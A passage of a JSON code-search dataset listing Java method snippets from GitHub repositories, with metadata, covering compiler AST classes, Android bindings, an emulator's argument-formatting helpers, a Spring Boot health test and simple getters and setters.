"String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "\tpublic static String makeStr(String wordOne, String wordTwo) {\n\t\treturn \"<\"+wordTwo+\">\" + wordOne + \"</\"+wordTwo+\">\";\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day9/Calculator.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59558, "method_name": "main", "class_name": "AndroidTest", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws IOException {\n        new AndroidTest().test();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/test/java/com/github/unidbg/android/AndroidTest.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59559, "method_name": "test", "class_name": "AndroidTest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void test() {\n        System.err.println(\"exit code: \" + module.callEntry(emulator));\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/test/java/com/github/unidbg/android/AndroidTest.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59560, "method_name": "checkType", "class_name": "Expr", "params": [], "throws": ["TypeException"], "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "\tpublic abstract void checkType() throws TypeException;\n\tpublic abstract Object constEval(Environment<ExprVALUE> const_environment) throws EnvironmentException, TypeException;\n\n\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59561, "method_name": "constEval", "class_name": "Expr", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public", "abstract"], "return_type": "Object", "snippet": "\tpublic abstract Object constEval(Environment<ExprVALUE> const_environment) throws EnvironmentException, TypeException;\n\n\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59562, "method_name": "getType", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Type", "snippet": "\tpublic Type getType() {\n\t\treturn type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59563, "method_name": "getTypeCode", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TypeCode", "snippet": "\tpublic TypeCode getTypeCode() {\n\t\treturn type.getTypeCode();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59564, "method_name": "getSize", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getSize() {\n\t\treturn type.getSize();\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59565, "method_name": "setType", "class_name": "Expr", "params": ["Type"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setType(Type type) {\n\t\tthis.type = type;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59566, "method_name": "indent", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void indent() {\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59567, "method_name": "isVARIABLE", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isVARIABLE() {\n\t\treturn this instanceof ExprVARIABLE;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59568, "method_name": "isPOINTER", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isPOINTER() {\n\t\treturn this instanceof ExprPOINTER;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59569, "method_name": "isADRESS", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isADRESS() {\n\t\treturn this instanceof ExprADDRESS;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59570, "method_name": "isDOT", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isDOT() {\n\t\treturn this instanceof ExprDOT;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59571, "method_name": "isARRAY", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isARRAY() {\n\t\treturn this instanceof ExprARRAY;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59572, "method_name": "isVALUE", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isVALUE() {\n\t\treturn this instanceof ExprVALUE;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59573, "method_name": "isOP", "class_name": "Expr", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\tprotected boolean isOP() {\n\t\treturn this instanceof ExprPLUS\n\t\t\t\t|| this instanceof ExprMINUS\n\t\t\t\t|| this instanceof ExprMUL\n\t\t\t\t|| this instanceof ExprDIV\n\t\t\t\t|| this instanceof ExprMOD\n\t\t\t\t|| this instanceof ExprUMINUS\n\t\t\t\t|| this instanceof ExprAND\n\t\t\t\t|| this instanceof ExprOR\n\t\t\t\t|| this instanceof ExprNOT\n\t\t\t\t|| this instanceof ExprLT\n\t\t\t\t|| this instanceof ExprLE\n\t\t\t\t|| this instanceof ExprGT\n\t\t\t\t|| this instanceof ExprGE\n\t\t\t\t|| this instanceof ExprEQ\n\t\t\t\t|| this instanceof ExprNE;\n\t\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59574, "method_name": "generateCode", "class_name": "Expr", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\n\t\t// Produit un commentaire sommaire pour rappeler\n\t\t// l'expression du langage L\u00e9a\n\t\treturn NL + tab() + \"/* \" + this.toString() + \" */\" + NL;\n\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/Expr.java", "stars": "3", "class_props": {"extends": "Code", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59575, "method_name": "testHealth", "class_name": "ManagementPortWithLazyInitializationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid testHealth() {\n\t\tResponseEntity<String> entity = new TestRestTemplate().withBasicAuth(\"user\", \"password\")\n\t\t\t\t.getForEntity(\"http://localhost:\" + this.managementPort + \"/actuator/health\", String.class);\n\t\tassertThat(entity.getStatusCode()).isEqualTo(HttpStatus.OK);\n\t\tassertThat(entity.getBody()).contains(\"\\\"status\\\":\\\"UP\\\"\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-actuator/src/test/java/smoketest/actuator/ManagementPortWithLazyInitializationTests.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 59576, "method_name": "onTransitionCancel", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionCancel (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionCancel (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59577, "method_name": "n_onTransitionCancel", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionCancel (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionEnd (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionEnd (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59578, "method_name": "onTransitionEnd", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionEnd (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionEnd (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59579, "method_name": "n_onTransitionEnd", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionEnd (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionPause (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionPause (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59580, "method_name": "onTransitionPause", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionPause (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionPause (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59581, "method_name": "n_onTransitionPause", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionPause (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionResume (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionResume (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59582, "method_name": "onTransitionResume", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionResume (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionResume (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59583, "method_name": "n_onTransitionResume", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionResume (android.support.transition.Transition p0);\n\n\n\tpublic void onTransitionStart (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionStart (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59584, "method_name": "onTransitionStart", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onTransitionStart (android.support.transition.Transition p0)\n\t{\n\t\tn_onTransitionStart (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59585, "method_name": "n_onTransitionStart", "class_name": "Transition_TransitionListenerImplementor", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onTransitionStart (android.support.transition.Transition p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59586, "method_name": "monodroidAddReference", "class_name": "Transition_TransitionListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59587, "method_name": "monodroidClearReferences", "class_name": "Transition_TransitionListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/transition/Transition_TransitionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 59588, "method_name": "main", "class_name": "DemoLock", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa Runnable \u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Lockmpl run = new Lockmpl();\n        //\u521b\u5efaThread\u7c7b\u5bf9\u8c61\uff0c\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u9012Runnable\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Thread t0 = new Thread(run);\n        Thread t1 = new Thread(run);\n        Thread t2 = new Thread(run);\n        //\u8c03\u7528start\u65b9\u6cd5\u5f00\u542f\u591a\u7ebf\u7a0b\n        t0.start();\n        t1.start();\n        t2.start();\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/java2/Lock/DemoLock.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59589, "method_name": "getRefreshIntervalInSeconds", "class_name": "ConfigModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRefreshIntervalInSeconds() {\n        return refreshIntervalInSeconds;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59590, "method_name": "setRefreshIntervalInSeconds", "class_name": "ConfigModel", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRefreshIntervalInSeconds(int refreshIntervalInSeconds) {\n        this.refreshIntervalInSeconds = refreshIntervalInSeconds;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59591, "method_name": "getCountryName", "class_name": "ConfigModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCountryName() {\n        return countryName;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59592, "method_name": "setCountryName", "class_name": "ConfigModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCountryName(String countryName) {\n        this.countryName = countryName;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59593, "method_name": "getCountryCode", "class_name": "ConfigModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCountryCode() {\n        return countryCode;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59594, "method_name": "setCountryCode", "class_name": "ConfigModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCountryCode(String countryCode) {\n        this.countryCode = countryCode;\n    }", "url": "https://raw.githubusercontent.com/afsalashyana/Covid19-Desktop-Widget/master/src/main/java/com/genuinecoder/config/ConfigModel.java", "stars": "11", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59595, "method_name": "formatArgs", "class_name": "VaList", "params": [], "throws": null, "modifiers": ["final"], "return_type": "String", "snippet": "    final String formatArgs() {\n        String shorty = method.decodeArgsShorty();\n        char[] chars = shorty.toCharArray();\n        List<String> format = new ArrayList<>(chars.length);\n        List<Object> args = new ArrayList<>(chars.length);\n        int offset = 0;\n        for (char c : chars) {\n            switch (c) {\n                case 'B':\n                    format.add(\"%s\");\n                    args.add((byte) getInt(offset));\n                    offset += 4;\n                    break;\n                case 'C':\n                    format.add(\"%c\");\n                    args.add((char) getInt(offset));\n                    offset += 4;\n                    break;\n                case 'I':\n                    format.add(\"0x%x\");\n                    args.add(getInt(offset));\n                    offset += 4;\n                    break;\n                case 'S':\n                    format.add(\"%s\");\n                    args.add((short) getInt(offset));\n                    offset += 4;\n                    break;\n                case 'Z':\n                    format.add(\"%s\");\n                    args.add(getInt(offset) == VM.JNI_TRUE);\n                    offset += 4;\n                    break;\n                case 'F':\n                    format.add(\"%f\");\n                    args.add(getFloat(offset));\n                    offset += 4;\n                    break;\n                case 'L':\n                    format.add(\"%s\");\n                    args.add(this.getObject(offset));\n                    offset += 4;\n                    break;\n                case 'D':\n                    format.add(\"%s\");\n                    args.add(getDouble(offset));\n                    offset += 8;\n                    break;\n                case 'J':\n                    format.add(\"0x%x\");\n                    args.add(getLong(offset));\n                    offset += 8;\n                    break;\n                default:\n                    throw new IllegalStateException(\"c=\" + c);\n            }\n        }\n        StringBuilder sb = new StringBuilder();\n        if (!format.isEmpty()) {\n            sb.append(format.remove(0));\n        }\n        for (String str : format) {\n            sb.append(\", \").append(str);\n        }\n        return String.format(sb.toString(), args.toArray());\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59596, "method_name": "getObject", "class_name": "VaList", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "T", "snippet": "    public final  <T extends DvmObject<?>> T getObject(int offset) {\n        long p = getInt(offset);\n        if (p == 0) {\n            return null;\n        } else {\n            return vm.getObject(p & 0xffffffffL);\n        }\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59597, "method_name": "getInt", "class_name": "VaList", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "int", "snippet": "    public final int getInt(int offset) {\n        buffer.position(offset);\n        return buffer.getInt();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59598, "method_name": "getLong", "class_name": "VaList", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "long", "snippet": "    public final long getLong(int offset) {\n        buffer.position(offset);\n        return buffer.getLong();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59599, "method_name": "getFloat", "class_name": "VaList", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "float", "snippet": "    public final float getFloat(int offset) {\n        buffer.position(offset);\n        return buffer.getFloat();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59600, "method_name": "getDouble", "class_name": "VaList", "params": ["int"], "throws": null, "modifiers": ["final", "public"], "return_type": "double", "snippet": "    public final double getDouble(int offset) {\n        buffer.position(offset);\n        return buffer.getDouble();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/VaList.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 59601, "method_name": "getHeader", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getHeader() {\n        return header;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59602, "method_name": "setHeader", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHeader(String header) {\n        this.header = header;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59603, "method_name": "getValue", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getValue() {\n        return value;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59604, "method_name": "setValue", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(String value) {\n        this.value = value;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59605, "method_name": "getColor", "class_name": "CountyCaseData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getColor() {\n        return color;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59606, "method_name": "setColor", "class_name": "CountyCaseData", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColor(String color) {\n        this.color = color;\n    }", "url": "https://raw.githubusercontent.com/RzTutul/Covid-19/master/app/src/main/java/com/example/covid19/pojo/CountyCaseData.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59607, "method_name": "getImageId", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getImageId() {\n        return imageId;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59608, "method_name": "setImageId", "class_name": "RowItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setImageId(int imageId) {\n        this.imageId = imageId;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59609, "method_name": "getDesc", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDesc() {\n        return desc;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59610, "method_name": "setDesc", "class_name": "RowItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDesc(String desc) {\n        this.desc = desc;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59611, "method_name": "getTitle", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59612, "method_name": "setTitle", "class_name": "RowItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/customlistviewBaseAdapter/src/com/example/customlistviewbaseadapter/RowItem.java", "stars": "74", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 59613, "method_name": "toString", "class_name": "RowItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String toString() {\n        return title + \"\\n\" + desc;\n    }", "url": 